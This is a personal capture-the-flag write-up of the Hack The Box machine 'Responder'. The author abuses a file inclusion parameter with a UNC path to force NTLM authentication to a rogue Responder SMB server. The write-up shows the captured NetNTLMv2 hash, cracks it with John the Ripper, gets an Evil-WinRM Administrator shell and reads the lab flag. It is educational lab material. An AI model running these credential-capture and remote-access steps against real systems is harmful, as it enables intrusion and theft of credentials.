---
title: Responder, Windows
date: 09/10/2026
tags: ["Overview", "Enumeration", "Exploitation", "Cracking the Hash", "Gaining Access", "Post-Exploitation", "Conclusion"]
draft: "false"
---

### Responder | Windows

#### *Overview*
Responder is a windows machine(server to be specific) that showcases how a file inclusion vulnerability can be leveraged to capture user credentials via Responder and use them to get a remote PowerShell session on the machine.

A file inclusion vulnerability allows an attacker to access sensitive files on a server by manipulating user input(often a URL parameter), besides reading files, it can lead to code execution or forced outbound connections. 
*file inclusion can be remote or local, remote file inclusion involves a file on an external resource/URL while a local file inclusion involves a file already on the server.*

```PHP
include ($_GET["page"])
```

- this is PHP code, `$_GET` is a builtin PHP parameter that holds URL query parameters. Example: `https://example.com/index.php?page=about`, so in this URL `$_GET` holds the parameter `about` --> `$_GET["about"]`, this translates to, "get the value of the URL parameter called 'about'". Now the outer `include (...)` takes the resolved value and inserts it into the current page.
- the file inclusion vulnerability arises when the app doesn't restrict what file can be included.

In this case, we'll attempt a "remote" file inclusion to an SMB server(we control) running responder utility.

```PowerShell

\\theSMBServer-IP\share\file.txt # this is what we'll include in the `$_GET` variable to force an authentication to our server.
# this forces the windows server to make an SMB connection to us.
```

By providing a UNC path, Windows treats `\\Server\Share` as network location and attempts to open it over SMB, doing so requires authentication, because of this, windows performs the authentication automatically using the credentials of the account running the web server process.
On our side, my machine acts as rogue SMB server issuing out a random authentication challenge and records the client's response. The captured response is a NetNTLMv2 challenge/response and it looks something like this, `username::domain:serverchallenge:NTProofStr:blob`.
NetNTLMv2 is the network form of the NTLMv2 authentication protocol, instead of transmitting the password, the client proves knowledge of it by computing a response made up of the server's challenge and the user-derived password hash(the NT hash).
The captured blob never contains the password itself but it's a password-derived proof that can be attacked offline.
We then crack the NetNTLMv2 response using John the Ripper to extract the plaintext password(caveat: John the Ripper works if the password is weak), we'll then use this password to authenticate to a remote service(WinRM via Evil-WinRM) and get a terminal session on the machine.

#### *Enumeration*

```Bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nmap 10.129.137.127                              
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-07 13:32 -0400
Nmap scan report for 10.129.137.127
Host is up (0.27s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 25.67 seconds
```

Perfoming an Nmap scan indeed shows two service open, `http` and `wsman`(this means WinRM is open and we can use it to access this windows server remotely).
Since this is a web server, we can take a look at the web-app it hosts by visiting the IP using a browser(or `curl`).

![[ResponderWebAppHome.png]]

Something interesting to note, visiting the IP on firefox redirects to `http://unika.htb` and connection fails.
This happens because `unika.htb` isn't actually a real registered domain name so DNS resolution fails and the browser can't find an IP to connect to. To override this, we add the domain name alongside its IP in our local `/etc/hosts`, this is the file the browser checks before querying the DNS resolver.

```Bash
┌──(kali㉿kali)-[~]
└─$ batcat /etc/hosts
─────┬──────────────────────────────────────────────────────────────────────
File: /etc/hosts
─────┼──────────────────────────────────────────────────────────────────────
   1 │ 127.0.0.1   localhost
   2 │ 127.0.1.1   kali
   3 │ ::1     localhost ip6-localhost ip6-loopback
   4 │ ff02::1     ip6-allnodes
   5 │ ff02::2     ip6-allrouters 
─────┴──────────────────────────────────────────────────────────────────────
```

```Bash
┌──(kali㉿kali)-[~]
└─$ batcat /etc/hosts
─────┬──────────────────────────────────────────────────────────────────────
     │ File: /etc/hosts
─────┼──────────────────────────────────────────────────────────────────────
   1 │ 127.0.0.1   localhost
   2 │ 127.0.1.1   kali
   3 │ 10.129.137.127 unika.htb
   4 │ ::1     localhost ip6-localhost ip6-loopback
   5 │ ff02::1     ip6-allnodes
   6 │ ff02::2     ip6-allrouters
   7 │ 
─────┴──────────────────────────────────────────────────────────────────────
```

![[ResponderRealHomePg.png]]

Now that that's out of the way, there's a question on HTB for this specific machine that needs discussion.

```text
What is the name of the URL parameter which is used to load different language versions of the webpage?
```

- the default URL parameter(according to Claude) should be `lang` or `language` but that's not answer in this case. Looking at the options on top of the website, we see a language switcher and when selecting another language, we can observe that the URL parameter to load a different language option is `page`.
*This is actually interesting, `page` could be our vulnerable parameter, we could insert our 'SMB payload' instead of a valid language to make the windows server authenticate to my kali machine.*

#### *Exploitation*
Now that we have identified our vulnerable URL parameter, it's time to trigger a file inclusion on the target.

![[ResponderBadParam.png]]

First, we run the responder utility as root.

```Bash
──(kali㉿kali)-[~]
└─$ sudo responder -I tun0                         
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|
...
[SNIP]


[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]

...
[SNIP]

[+] Listening for events...                                                                                                                                  

[!] Error starting TCP server on port 80, check permissions or other servers running.
[!] Error starting TCP server on port 21, check permissions or other servers running.
[!] Error starting TCP server on port 53, check permissions or other servers running.


```

This automatically starts a rogue SMB server on port 445 along other listeners. Since setting up the listener is done, we can trigger the file inclusion on the target.

![[ResponderFITrigger.png]]


When the windows Server tries to access the path, responder prints the user's(who the web server process is running as) credentials(useraname and the NetNTLMv2 hash) on the terminal.

```Bash
[SMB] NTLMv2-SSP Client   : 10.129.137.127
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:5665c01209e82d1a:1C43BD23D3D8DCC79A0D8DF12FD02943:01010000000000000037A3D67626DD0165FCBA8DEB8F8F9900000000020008004C0057004F00430001001E00570049004E002D004600310036004900460046004D00530035003900350004003400570049004E002D004600310036004900460046004D0053003500390035002E004C0057004F0043002E004C004F00430041004C00030014004C0057004F0043002E004C004F00430041004C00050014004C0057004F0043002E004C004F00430041004C00070008000037A3D67626DD01060004000200000008003000300000000000000001000000002000002791B67F78FE4BE0540644DC06C40345A2436612FCFFD2ED8F9935FFF558ED180A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00340034000000000000000000                                                      
[*] Skipping previously captured hash for RESPONDER\Administrator
[*] Skipping previously captured hash for RESPONDER\Administrator
[*] Skipping previously captured hash for RESPONDER\Administrator

```


#### *Cracking the Hash*
We have the hash, to attempt retrieving the password in plaintext, we'll use John the Ripper. 

```Bash
┌──(kali㉿kali)-[~/PersonalProjos/HackTheBox/machines/Responder]
└─$ john --wordlist=/home/kali/PersonalProjos/HackTheBox/machines/Responder/rockyou.txt Responder-Hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:00 DONE (2026-08-07 14:53) 7.692g/s 31507p/s 31507c/s 31507C/s adriano..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

John cracked the hash. The `Administrator`'s password is `badminton`.

#### *Gaining Access*
Looking back at an nmap scan we did earlier, we saw `wsman` listening on port 5895. This service allows administrators to control windows machines remotely. Since this service is open and we have the administrator's password, we can gain a direct path to a remote terminal.
To do so, we'll use the `evil-winrm` utility.

```Bash
┌──(kali㉿kali)-[~/PersonalProjos/HackTheBox/machines/Responder]
└─$ evil-winrm -i 10.129.137.127 -u Administrator -p badminton
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
responder\administrator

```

Our connection was successful and we're dropped into a remote PowerShell Prompt on the target. 

#### *Post-Exploitation*
Now that we have access a command line session on the web server, we can look around for valuable information. We can check how many users are there besides `Administrator`

```PowerShell
*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-LocalUser

Name               Enabled Description
----               ------- -----------
Administrator      True    Built-in account for administering the computer/domain
DefaultAccount     False   A user account managed by the system.
Guest              False   Built-in account for guest access to the computer/domain
mike               True
WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender Application Guard scenarios.

```

Much more can be done once on the target but right now, our interest is the flag and since it's in the user `mike`'s directory, we'll search for it.

```PowerShell
*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-ChildItem -Path C:\Users\mike -Recurse -Force -Filter *flag*


    Directory: C:\Users\mike\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/10/2022   4:50 AM             32 flag.txt

```

Now that we have it, we can open it and submit it.

```PowerShell
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\mike\Desktop\flag.txt
ea81b7afddd03efaa0945333ed147fac 
```

#### *Conclusion*
This exercise showed how a single file inclusion flaw can lead to full system compromise. By abusing the unsanitized page parameter, the Windows server was tricked into connecting to a rogue SMB server (Responder) via a UNC path. The server automatically authenticated, leaking a NetNTLMv2 challenge/response for the Administrator account. The weak password was cracked with John the Ripper, and the exposed WinRM service (5985) was then used with Evil-WinRM to obtain a remote PowerShell session with Administrator privileges.
